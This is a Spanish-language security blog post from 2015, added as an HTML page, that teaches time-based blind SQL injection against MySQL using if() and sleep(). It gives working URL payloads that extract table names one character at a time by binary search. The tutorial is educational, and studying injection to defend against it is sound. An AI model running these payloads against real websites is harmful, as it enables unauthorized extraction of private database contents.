@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Blind Mysqli Time Based [Teoria] - Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="by [Q]3rV[0]Mientras "auditaba" una web, lo digo entre comillas por que no me dedico a eso en lo laboral, me encontré con una intrépida variante de &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/blog/2015/01/13/blind-mysqli-time-based-teoria/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Blind Mysqli Time Based [Teoria]</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T17:52:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:52 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><div style="text-align: right;"><div class="separator" style="clear: both; text-align: center;"><a href="http://www.trendgibbons.net/wp-content/uploads/2014/09/Screen-Shot-2014-09-03-at-10.06.17-PM.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://www.trendgibbons.net/wp-content/uploads/2014/09/Screen-Shot-2014-09-03-at-10.06.17-PM.png" height="290" width="400" /></a></div><br /><b>by [Q]3rV[0]</b></div><br />Mientras "auditaba" una web, lo digo entre comillas por que no me dedico a eso en lo laboral, me encontré con una intrépida variante de SQL Injection descartando las demás posibilidades a través de las respuestas que generaba el servidor, note que se trataba de una:<br /><br /><div style="text-align: center;"><b>"Blind Sqli basada en tiempo"</b> </div><br />Paso a explicar a quienes no se encuentren familiarizados con este tipo de inyección.<br /><br />Basicamente una "Blind mysqli basada en tiempo" se trata de inyectar a ciegas como toda blind, en mi caso utilizando la técnica de busqueda binaria (la mas comunmente utilizada en estas situaciones) pero se da cuando la aplicación muestra el mismo mensaje TRUE OR FALSE, es decir que da los mismo inyectar<br />un: <br /><br />OR 1=1 que un OR 2+5/87=9999999999 <br /><br />el sitio web nos seguira mostrando el mismo mensaje de error, o puede deberse a realizar una carga incorrecta del contenido web, o cualquier otra variación en el sitio, da lo mismo, la aplicación resulta vulnerable pero no podremos deducir cual es la inyección correcta.<br /><br />Para estas situaciones, podemos hacer uso de la función sleep() y la estructura condicional if(), ahora paso a explicar la sintaxis de cada una de estas.<br /><br />La sintaxis de if es la siguiente:<br /><br />if(&lt;condicion&gt;,&lt;si la condicion se cumple&gt;,&lt;si la condicion no se cumple&gt;)<br /><br />Por ejemplo:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-Xrh8RaTOm5Y/VLXJ3wLC9SI/AAAAAAAAAJQ/HaQT2Wl2iAA/s1600/sleep.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-Xrh8RaTOm5Y/VLXJ3wLC9SI/AAAAAAAAAJQ/HaQT2Wl2iAA/s1600/sleep.png" height="147" width="640" /></a></div><br />sleep() se utiliza para producir una pausa de tantos segundos, vamos a combinarlo con if() e imponerlo si la condicion no se cumple.<br /><br /><div style="text-align: center;"><a href="http://1.bp.blogspot.com/-m_XgCZEZxCc/VLXKFFBq2rI/AAAAAAAAAJY/hu71cABVUWU/s1600/sleep2.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-m_XgCZEZxCc/VLXKFFBq2rI/AAAAAAAAAJY/hu71cABVUWU/s1600/sleep2.png" height="156" width="640" /></a></div><br />Como vemos la condición dio como resultado falsa y se le introdujo un retardo de 3 seg ante dicha respuesta.<br /><br />ahora se pueden imaginar el resultado del vector al combinar ambas funciones con una blind sqli??<br /><br />No se trata de nada rebuscado, solo hay que utilizar como condición el vector sqli para dicha inyección por ejemplo:<br /><br />Empecemos desde cero, supongamos que encontraron una web vulnerable que da con el perfil de este tipo de inyección y queremos verificar que en realidad se trata de esta, comenzariamos por introcir el siguiente vector en el parametro devil.<br /><br /><pre class="brush: sql">http://vuln-bsqli-based-time/?devil=5 or 1=if(1=1,sleep(5),0)--&nbsp;&nbsp; &gt; 5 segundos(TRUE)<br />http://vuln-bsqli-based-time/?devil=5 or 1=if(1=9999,sleep(5),0)--&nbsp; &gt; FALSE</pre><br />Ahora ya nos damos una idea de como inyectar en la aplicacion comenzando por obtener el listado de las tablas en la base de datos, normalmente en una blind sqli seria de la siguiente manera:<br /><br /><pre class="brush: sql">http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))&gt;15-- TRUEhttp://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))&gt;50-- TRUE<br />http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))&gt;100-- FALSE<br />http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))&gt;68-- FALSE<br />http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))=67-- TRUE</pre><br />Veamos como queda armado el vector haciendo uso de nuestro amigo "el tiempo":<br /><br /><br /><pre class="brush: sql">http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))&gt;15,sleep(5),0)-- TRUE 5 segundos<br />http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))&gt;50,sleep(5),0)-- TRUE 5 segundos<br />http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))&gt;100,sleep(5),0)-- FALSE<br />http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))&gt;68,sleep(5),0)-- FALSE<br />http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))=67,sleep(5),0)-- TRUE 5 segundos<br /></pre>Sencillo, lo unico que tiene de rebuscado esta tecnica es mantener la paciencia mientras se lleva a cabo la inyección manualmente.<br /><br /><div style="text-align: right;">Saludos!</div></div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T17:52:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:52 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2015/01/13/blind-mysqli-time-based-teoria/" data-via="" data-counturl="http://securitysignal.github.io/blog/2015/01/13/blind-mysqli-time-based-teoria/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/01/13/sql-inyection-traves-de-cabeceras-http/" title="Previous Post: SQL Inyection a traves de cabeceras HTTP">&laquo; SQL Inyection a traves de cabeceras HTTP</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/01/13/sqli-error-based-extractvalue-updatexml/" title="Next Post: SQLI Error Based extractvalue() & updatexml()">SQLI Error Based extractvalue() & updatexml() &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
